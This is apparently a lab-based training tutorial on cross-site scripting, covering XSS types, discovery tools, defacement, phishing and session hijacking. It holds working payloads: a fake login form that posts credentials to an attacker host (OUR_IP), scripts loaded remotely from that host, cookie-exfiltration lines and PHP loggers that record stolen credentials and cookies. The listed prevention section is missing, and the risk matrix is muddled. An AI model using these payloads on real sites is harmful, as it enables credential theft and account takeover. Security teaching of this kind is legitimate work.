# Cross-Site Scripting (XSS)

- [Introduction](#intro-to-xss)
- [Stored XSS](#stored-xss)
- [Reflected XSS](#reflected-xss)
- [DOM XSS](#dom-xss)
- [XSS Discovery](#xss-discovery)
- [Defacing](#defacing)
- [Phishing](#phishing)
- [Session Hijacking](#session-hijacking)
- [XSS prevention](#xss-prevention)
- [Skills Assessment](#skills-assessment)

## Introduction

As web applications become more advanced and more common, so do web application vulnerabilities. Among the most common types of web application vulnerabilities are [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) vulnerabilities. XSS vulnerabilities take advantage of a flaw in user input sanitization to “write” JavaScript code to the page and execute it on the client side, leading to several types of attacks.

---

### What is XSS

A typical web application works by receiving the HTML code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra JavaScript code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious JavaScript code.

XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a **medium risk**:

- **Low impact + high probability = medium risk**

We should always attempt to **reduce** risk by detecting, remediating, and proactively preventing these types of vulnerabilities.

---

### Risk Matrix (Probability vs Impact)

```
High Probability | Low Probability
-----------------|----------------
Reduce           | Avoid
-----------------|----------------
Accept           | Transfer
```

- **Reduce**: High probability, low impact
- **Avoid**: High probability, high impact
- **Accept**: Low probability, low impact
- **Transfer**: Low probability, high impact

---

### XSS Attacks

XSS vulnerabilities can facilitate a wide range of attacks, which can be anything that can be executed through browser JavaScript code. 

Examples include:

- Hijacking a user's session by having them unknowingly send their session cookie to the attacker
- Executing API calls on the victim’s behalf to perform unauthorized actions (e.g., change password)
- Logging keystrokes
- Displaying fake login pages
- Stealing credentials
- Showing fake error messages

XSS attacks are limited to the browser’s JavaScript engine (e.g., V8 in Chrome), so they cannot execute system-level JS code. They are generally **confined to the browser sandbox**, but browser bugs (e.g., heap overflows) can be chained with XSS to execute code on the user’s machine.

#### Notable XSS Attack Examples

- **Samy Worm (2005)**: Exploited stored XSS on MySpace, spreading via profile comments. Within a day, over a million users had a malicious payload in their profiles.
- **TweetDeck Vulnerability (2014)**: A researcher discovered an XSS in TweetDeck that could create self-retweeting tweets, forcing Twitter to shut down TweetDeck temporarily.
- **Apache Server Vulnerability**: Apache once had a reported XSS vulnerability that allowed attackers to steal user passwords.
- **Google XSS (2019)**: A vulnerability in the XML library of Google Search was exploited.

These examples show that XSS is not a trivial vulnerability—large, reputable platforms have been affected by it, and the risk remains very real today.

---

### Types of XSS

There are three main types of XSS vulnerabilities:

| Type                      | Description |
|---------------------------|-------------|
| **Stored (Persistent) XSS** | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments). |
| **Reflected (Non-Persistent) XSS** | Occurs when user input is displayed on the page after being processed by the back-end server, but without being stored (e.g., search result or error message). |
| **DOM-based XSS** | Another non-persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client side, without reaching the back-end server (e.g., through HTTP parameters or anchors). |

Each type will be examined in detail in subsequent sections.

## Stored XSS

Before we learn how to discover XSS vulnerabilities and utilize them for various attacks, we must first understand the different types of XSS vulnerabilities and their differences to know which to use in each kind of attack.

The first and most critical type of XSS vulnerability is **Stored XSS** or **Persistent XSS**. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.

We can start the server below to view and practice a Stored XSS example. As we can see, the web page is a simple **To-Do List** app that we can add items to. We can try typing `test` and hitting enter/return to add a new item and see how the page handles it.

---

### XSS Testing Payloads

We can test whether the page is vulnerable to XSS with the following basic XSS payload:

```html
<script>alert(window.origin)</script>
```

We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed.

Suppose the page allows any input and does not perform any sanitization on it. In that case, the alert should pop up with the URL of the page it is being executed on, directly after we input our payload or when we refresh the page:

```html
<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script></ul></ul>
```

> **Tip:** Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

---

As some modern browsers may block the `alert()` JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is `<plaintext>`, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is `<script>print()</script>` that will pop up the browser print dialog, which is unlikely to be blocked by any browsers. Try using these payloads to see how each works. You may use the reset button to remove any current payloads.

To see whether the payload is persistent and stored on the back-end, we can refresh the page and see whether we get the alert again. If we do, we would see that we keep getting the alert even throughout page refreshes, confirming that this is indeed a **Stored/Persistent XSS** vulnerability. This is not unique to us, as any user who visits the page will trigger the XSS payload and get the same alert.

## Reflected XSS

Reflected XSS is one of the two types of **Non-Persistent** Cross-Site Scripting vulnerabilities. In this attack, the malicious input is sent to the server and immediately reflected back in the HTTP response. This means the data is processed by the backend and embedded in the resulting HTML page without proper sanitization. Unlike **Stored XSS**, reflected XSS does **not** persist across sessions or page reloads — it is only effective for that specific request/response cycle.

---

### How Reflected XSS Works

Reflected XSS typically occurs in web applications where user input (e.g., query parameters, form fields) is returned in an error message, search result, or any other immediate response. If the application includes this input in the HTML output without proper encoding or validation, a malicious user can craft a payload that gets executed by the victim's browser.

Since the attack is transient, it only affects the user who receives and loads the specially crafted URL. The malicious script is "reflected" off the server and executed in the victim’s browser.

---

### Testing for Reflected XSS

To determine if an application is vulnerable to reflected XSS:

1. **Send a harmless string** (like `test`) as a parameter in the URL or form.
2. **Check the response** to see if the input is reflected back in the HTML.
3. **Inject a basic XSS payload**, like:
   ```html
   <script>alert(window.origin)</script>
   ```
4. If the alert executes, it confirms that the input was not sanitized, and the page is vulnerable to reflected XSS.

---

### Example Attack

Imagine a web application that returns this error message:

```
Task 'test' could not be added.
```

If you replace `test` with:
```html
<script>alert(window.origin)</script>
```

And the error message becomes:
```
Task '<script>alert(window.origin)</script>' could not be added.
```

...and the script runs, this confirms a reflected XSS vulnerability.

---

### Why Reflected XSS is Dangerous

Although the script does not persist in the system (i.e., it disappears after the user leaves the page), it is still a powerful tool for attackers. It can be used to:

- Steal cookies or session tokens.
- Redirect users to malicious websites.
- Display fake login forms for phishing.
- Exploit browser-based vulnerabilities.

---

### Delivering the Attack

Since the payload is embedded in the URL, reflected XSS is often delivered via **phishing emails**, **malicious links**, or **compromised third-party websites**. To carry out the attack, the attacker:

1. Identifies a vulnerable parameter.
2. Crafts a malicious URL, like:
   ```
   http://example.com/page?query=<script>alert(document.cookie)</script>
   ```
3. Sends the URL to the victim.
4. If the victim clicks the link and loads the page, the script executes.

---

### Key Points

- Reflected XSS is **non-persistent** — it only works when the crafted URL is visited.
- It requires user interaction (i.e., the victim must click a link or submit data).
- It often relies on social engineering (e.g., phishing).
- Prevention involves input validation, output encoding, and use of frameworks with built-in XSS protection.

## DOM XSS

**DOM-based XSS** is a type of **Non-Persistent** Cross-Site Scripting vulnerability where the malicious payload is executed entirely in the **browser**, without ever reaching the back-end server. The attack occurs when JavaScript in the web page processes user input (e.g., from the URL) and writes it directly to the page using insecure methods — all within the **Document Object Model (DOM)**.

---

### How DOM XSS Works

Unlike reflected or stored XSS, DOM XSS does not rely on the server to reflect or store the payload. Instead, it happens when client-side scripts directly read from the page (e.g., from the URL hash, parameters, or input fields) and inject unsanitized data back into the DOM.

This makes DOM XSS harder to detect using traditional server-side scanning tools because it never touches the server. The entire process takes place in the user's browser.

---

### Example of DOM XSS

Suppose a page updates content dynamically using JavaScript based on a URL fragment like this:

```
http://example.com/page#task=test
```

If JavaScript reads this value using something like:

```javascript
var task = document.URL.substring(pos + 5);
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

This is dangerous because `innerHTML` writes unescaped input directly into the DOM. An attacker could exploit this by sending:

```
http://example.com/page#task=<img src="" onerror="alert(window.origin)">
```

When visited, the payload executes — even though **no HTTP request was made** and the server never saw the payload.

---

### Identifying DOM XSS

To test for DOM XSS:

1. Look for pages where input is handled via the URL `#fragment` or query string.
2. Check whether changes in these parameters dynamically update the page.
3. Use browser developer tools (e.g., **Inspector**, **Network**, **Console**) to confirm that:
   - No network request is made when the payload is added.
   - The content is modified on the fly with JavaScript.

---

### Common Sources and Sinks

- **Sources** (where user input comes from):
  - `document.URL`
  - `location.hash`
  - `document.referrer`

- **Sinks** (dangerous functions where input is written):
  - `element.innerHTML`
  - `document.write()`
  - `eval()`
  - jQuery methods like `.html()`, `.append()`, `.after()`

If a source is passed into a sink without sanitization, XSS is possible.

---

### Example Vulnerable Code

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5);
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

If a user visits:
```
http://example.com/page#task=<img src="" onerror="alert('XSS')">
```

...then JavaScript injects the payload into the DOM and it executes.

---

### DOM XSS Payloads

- Basic:
  ```html
  <img src="" onerror="alert(window.origin)">
  ```

- Other forms:
  ```html
  <svg onload=alert(1)>
  <iframe src="javascript:alert(1)">
  <body onload=alert(1)>
  ```

---

### Prevention

- Avoid using unsafe DOM APIs (`innerHTML`, `document.write`, etc.).
- Sanitize and validate all user-controlled input.
- Use **safe DOM manipulation** methods:
  - `textContent` instead of `innerHTML`
  - `createElement()` + `appendChild()` for constructing DOM safely
- Use modern front-end frameworks that automatically escape data (e.g., React, Vue).

---

### Summary

- DOM XSS happens entirely in the **client** (browser).
- The **server is never involved** — no requests are made.
- It’s triggered when unsanitized input is injected into the DOM using vulnerable functions.
- Always inspect JavaScript code paths to identify dangerous `source → sink` flows.

## XSS Discovery

By now, we should have a good understanding of what an XSS vulnerability is, the three types of XSS, and how each type differs from the others. We should also understand how XSS works through injecting JavaScript code into the client-side page source, thus executing additional code, which we will later learn how to utilize to our advantage.

In this section, we will go through various ways of detecting XSS vulnerabilities within a web application. In web application vulnerabilities (and all vulnerabilities in general), detecting them can become as difficult as exploiting them. However, as XSS vulnerabilities are widespread, many tools can help us in detecting and identifying them.

---

### Automated Discovery

Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/)) have various capabilities for detecting all three types of XSS vulnerabilities.

These scanners usually do two types of scanning: A **Passive Scan**, which reviews client-side code for potential DOM-based vulnerabilities, and an **Active Scan**, which sends various types of payloads to attempt to trigger an XSS through payload injection in the page source.

While paid tools usually have a higher level of accuracy in detecting XSS vulnerabilities (especially when security bypasses are required), we can still find open-source tools that can assist us in identifying potential XSS vulnerabilities. Such tools usually work by identifying input fields in web pages, sending various types of XSS payloads, and then comparing the rendered page source to see if the same payload can be found in it, which may indicate a successful XSS injection.

Still, this will not always be accurate, as sometimes, even if the same payload was injected, it might not lead to a successful execution due to various reasons, so we must always manually verify the XSS injection.

Some of the common open-source tools that can assist us in XSS discovery are:

- [XSS Strike](https://github.com/s0md3v/XSStrike)
- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
- [XSSer](https://github.com/epsylon/xsser)

For example, we can try **XSS Strike** by cloning it to our VM using:

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```

Then, we can run the script and provide it a URL with a parameter using `-u`. For instance:

```bash
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

If vulnerable, the tool will test and return details about payload injection, reflections, and confidence score.

---

### Manual Discovery

When it comes to manual XSS discovery, the difficulty of finding the XSS vulnerability depends on the level of security of the web application. Basic XSS vulnerabilities can usually be found through testing various XSS payloads, but identifying advanced XSS vulnerabilities requires advanced code review skills.

---

#### XSS Payloads

The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page. We can find huge lists of XSS payloads online, like:

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [PayloadBox](https://github.com/payloadbox/xss-payload-list)

We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.

> **Note**: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

You will notice that the majority of the above payloads do not work with our example web applications, even though we are dealing with the most basic type of XSS vulnerabilities. This is because these payloads are written for a wide variety of injection points (like injecting after a single quote) or are designed to evade certain security measures (like sanitization filters). Furthermore, such payloads utilize a variety of injection vectors to execute JavaScript code, like basic `<script>` tags, ot her HTML Attributes like `<img>`, or even CSS `Style` attributes. This is why we can expect that many of these payloads will not work in all test cases, as they are designed to work with certain types of injections.

This is why it is not very efficient to resort to manually copying/pasting XSS payloads, as even if a web application is vulnerable, it may take us a while to identify the vulnerability, especially if we have many input fields to test. This is why it may be more efficient to write our own Python script to automate sending these payloads and then comparing the page source to see how our payloads were rendered. This can help us in advanced cases where XSS tools cannot easily send and compare payloads. This way, we would have the advantage of customizing our tool to our target web application. However, this is an advanced approach to XSS discovery, and it is not part of the scope of this module.

---

### Code Review

The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code. If we understand precisely how our input is being handled all the way until it reaches the web browser, we can write a custom payload that should work with high confidence.

In the previous section, we looked at a basic example of HTML code review when discussing the **Source** and **Sink** for DOM-based XSS vulnerabilities. This gave us a quick look at how front-end code review works in identifying XSS vulnerabilities, although on a very basic front-end example.

We are unlikely to find any XSS vulnerabilities through payload lists or XSS tools for the more common web applications. This is because the developers of such web applications likely run their application through vulnerability assessment tools and then patch any identified vulnerabilities before release. For such cases, manual code review may reveal undetected XSS vulnerabilities, which may survive public releases of common web applications. These are also advanced techniques that are out of the scope of this module. Still, if you are interested in learning them, the Secure Coding 101 and Whitebox Pentesting modules will thoroughly cover this topic.

## Defacing

Now that we understand the different types of XSS and various methods of discovering them, we can begin exploring how to exploit them—starting with defacing attacks. These attacks are especially impactful when exploiting **Stored XSS** vulnerabilities, which persist across page refreshes and affect every user who loads the affected page.

A **defacing attack** is one of the most common real-world uses of stored XSS. The goal is to alter a webpage's appearance—often to make it look as though it's been hacked. Attackers may do this to send a message, damage reputation, or simply gain notoriety. A notable example is when hackers defaced the **UK National Health Service (NHS)** website in [2018](https://www.bbc.com/news/technology-42707503).

While many other types of vulnerabilities can also be used to deface websites, **Stored XSS** remains one of the most popular and effective for this purpose.

---

### Defacement Elements

By injecting JavaScript, we can control and modify the appearance of a vulnerable web page. While making the site “beautiful” isn’t the goal, we often want to deliver a message or hide evidence of the vulnerability.

Common HTML elements used for defacement include:

- **`document.body.style.background`** – Changes background color or adds an image.
- **`document.body.background`** – Alternate method to set a background image.
- **`document.title`** – Changes the page title shown in the browser tab.
- **`DOM.innerHTML`** – Replaces text on the page, or even the entire HTML structure.

---

### Changing the Background

To change the background color:

```html
<script>document.body.style.background = "#141d2b"</script>
```

To use an image as the background:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

---

### Changing the Page Title

We can modify the browser tab title with:

```html
<script>document.title = 'HackTheBox Academy'</script>
```

---

### Changing Page Text

We can update visible text on the web page using:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

Using jQuery (if available):

```javascript
$("#todo").html("New Text")
```

To overwrite the entire page content:

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

Here’s a complete HTML example you could inject:

```html
<center>
  <h1 style="color: white">Cyber Security Training</h1>
  <p style="color: white">
    by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
  </p>
</center>
```

Minified and injected with JavaScript:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>'</script>
```

---

### Final Example: Full Defacement Payloads

Using a combination of background, title, and text replacement:

```html
<div></div><ul class="list-unstyled" id="todo"><ul>
<script>document.body.style.background = "#141d2b"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '...SNIP...'</script>
</ul></ul>
```

This works because our JavaScript is appended at the end of the page. If our injection point was in the middle of the page or source code, we’d need to account for other elements that follow. To regular users, the page now appears fully defaced.

## Phishing

### Introduction

A very common type of XSS attack is a phishing attack. Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

Furthermore, suppose we were to identify an XSS vulnerability in a web application for a particular organization. In that case, we can use such an attack as a phishing simulation exercise, which will also help us evaluate the security awareness of the organization’s employees, especially if they trust the vulnerable web application and do not expect it to harm them.

---

### XSS Discovery

We start by attempting to find the XSS vulnerability in the web application at `/phishing`. When we visit the website, we see that it is a simple online image viewer, where we can input a URL of an image, and it will display it:

```
http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg
```

This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we’ve been using:

```
http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>
```

But when we try that payload, nothing gets executed and we get a dead image icon. This means `<script>` tags might be blocked, so we need to use other techniques.

---

### Login Form Injection

Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we’d get their credentials.

We can write our own login form. The following example should present a login form:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
  <input type="username" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" name="submit" value="Login">
</form>
```

We can now minify our HTML code and use the `document.write()` function to inject it using our XSS payload:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')
```

We then URL-encode this and inject it into the image viewer as the `url` parameter.

---

### Cleaning Up

To make the attack more believable, we need to remove the original input field that displays the URL field on the image viewer.

We inspect the HTML element using the developer tools and find that the input form has the ID `urlform`.

So, we write the following JavaScript to remove it:

```javascript
document.getElementById('urlform').remove();
```

We add this to our previous XSS payload, after the `document.write()` call:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

#### Optional Cleanup

There’s still a small piece of the original HTML code left after injecting our fake login form. This can be removed by simply commenting it out with an HTML opening comment:

```html
<!--
```

We append this to the payload to make the phishing page look clean and polished.

---

### Credential Stealing

Now, we want to capture the login credentials when a victim submits the form.

#### Using Netcat

We start a basic `netcat` server to listen for requests on port 80:

```bash
sudo nc -lvnp 80
```

Then we attempt to log in using dummy credentials like:

```
username=test
password=test
```

We should see this captured in the netcat terminal:

```
GET /?username=test&password=test&submit=Login HTTP/1.1
```

This confirms the data was submitted to our listener.

> ⚠️ **Note**: Netcat is simple and won’t handle HTTP responses, so the browser will show an error after submission.

---

### Optional: PHP Listener

To make the attack more seamless, we can run a PHP server that logs the credentials and then redirects the victim back to the original image viewer.

#### Create the PHP Script

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
  $file = fopen("creds.txt", "a+");
  fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
  header("Location: http://SERVER_IP/phishing/index.php");
  fclose($file);
  exit();
}
?>
```

#### Deploy the PHP Listener

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
# write the PHP file as index.php
php -S 0.0.0.0:80
```

Once this server is running, the victim will be redirected back to the image viewer as if nothing happened.

---

### Verifying the Credentials

To check if the credentials were captured, we simply view the `creds.txt` file:

```bash
cat creds.txt
```

Expected output:

```
Username: test | Password: test
```

---

### Final Notes

With everything in place, we can send the final phishing URL with the encoded payload to our victim. Once they open the URL and log in, we will receive their credentials, and they will be redirected back to the normal image viewer — unaware of what happened.

## Session Hijacking

Modern web applications use cookies to maintain a user's session across visits. If an attacker manages to steal these cookies, they can hijack the session and impersonate the victim without needing their login credentials.

If we can run JavaScript on the victim's browser, we can potentially send their cookies to our own server using a **Session Hijacking** technique, also known as **Cookie Stealing**.

---

### Blind XSS Detection

Blind XSS occurs when an injected payload executes on a page we do **not** have access to (e.g., an admin panel). We can’t directly observe the result, but we can detect execution by making our payload send an HTTP request back to us.

Common places for Blind XSS:
- Contact forms
- User details/reviews
- Support tickets
- HTTP headers like `User-Agent`

We begin testing by submitting a payload via a user registration form:
```
http://SERVER_IP:PORT/hijacking/index.php
```

After submitting the form, we receive a message saying:
> Thank you for registering. An Admin will review your registration request.

We can't see the payload outcome—but we **can** detect execution if our script makes a request to our server.

This gives rise to two questions:
1. **Which field is vulnerable?**
2. **Which payload works?**

---

### Loading a Remote Script

Instead of placing the whole payload inline, we can load JavaScript from a remote server:

```html
<script src="http://OUR_IP/script.js"></script>
```

To identify which field triggered the request, we name the script file after the field:
```html
<script src="http://OUR_IP/username"></script>
```

Useful examples from PayloadAllTheThings:
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
<script>var a=document.createElement('script');a.src='http://OUR_IP';document.body.appendChild(a)</script>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send()</script>
<script>$.getScript("http://OUR_IP")</script>
```

Start a simple server on our VM to catch any hits:
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Now test input fields like this:
```html
<script src=http://OUR_IP/fullname></script>  # goes in full-name field
<script src=http://OUR_IP/username></script>  # goes in username field
```

> ⚠️ Tip: Skip fields like email if they enforce strict formatting and aren’t rendered on the page.

Once we receive a call to our server, we note:
- The field name (from script URL)
- The payload used

---

### Exploiting with Session Hijacking

Once we find a working payload and know which field is vulnerable, we hijack the session.

Simple cookie exfiltration payloads:
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

We'll use the second option for stealth.

Save it into `script.js`:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Inject it like so:
```html
<script src=http://OUR_IP/script.js></script>
```

---

### Cookie Stealing Backend

Create a PHP script (`index.php`) on our VM to capture cookies:
```php
<?php
if (isset($_GET['c'])) {
  $list = explode(";", $_GET['c']);
  foreach ($list as $key => $value) {
    $cookie = urldecode($value);
    $file = fopen("cookies.txt", "a+");
    fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
    fclose($file);
  }
}
?>
```

Host it:
```bash
cd /tmp/tmpserver
vi index.php      # paste the above code
sudo php -S 0.0.0.0:80
```

When a victim loads the vulnerable page, you'll receive two hits:
1. For `script.js`
2. For `index.php?c=<cookie>`

Example server output:
```
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

You’ll also see it saved in `cookies.txt`:
```bash
cat cookies.txt
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

---

### Using the Cookie

To impersonate the victim:
1. Go to `/hijacking/login.php`
2. Open DevTools → Storage tab (`Shift+F9`)
3. Add a new cookie:
   - **Name**: `cookie`
   - **Value**: `f904f93c949d19d870911bf8b05fe7b2`
   - **Path**: `/hijacking`

Once set, refresh the page — you’re now logged in as the victim.